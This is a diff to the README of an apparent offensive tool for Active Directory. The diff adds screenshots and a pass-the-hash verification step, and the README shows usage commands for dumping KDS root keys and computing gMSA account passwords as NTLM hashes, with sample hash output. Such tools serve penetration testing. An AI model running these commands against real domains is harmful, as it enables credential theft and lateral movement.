@@ -52,11 +52,15 @@ L1 Index:               23
 L2 Index:               28
 ```
 
+![Enumerate gMSA Accounts](docs/enumGMSA.png)
+
 ### Dump KDS Root Keys
 
 ```bash
 python3 main.py -u 'user@domain.local' -p 'Pass' -d domain.local --dc-ip 10.0.0.1 kdsinfo
 ```
+
+![Dump KDS Root Keys](docs/dumpKDS.png)
 
 ### Compute gMSA Password (Online)
 
@@ -70,6 +74,8 @@ NTLM Hash (NT only):     1c368c74ef1bcbd4892c95a8d6de0f30
 NTLM Hash (nxc format):  aad3b435b51404eeaad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30
 ```
 
+![Compute gMSA Password (Online)](docs/onlineCompute.png)
+
 ### Compute gMSA Password (Offline)
 
 Extract the KDS Root Key blob and Password ID from a previous `kdsinfo`/`gmsainfo` run, then compute without network access:
@@ -80,6 +86,14 @@ python3 main.py compute \
     --kdskey 'AQAAAOlMCM5U37Qv...<base64>...' \
     --pwdid 'AQAAAEtEU0sC...<base64>...'
 ```
+
+![Compute gMSA Password (Offline)](docs/offlineCompute.png)
+
+### Verify Computed Hash with Pass-the-Hash
+
+The computed NTLM hash can be verified by using it for authentication:
+
+![Pass-the-Hash Verification](docs/testPassTheHash.png)
 
 ## How It Works
 
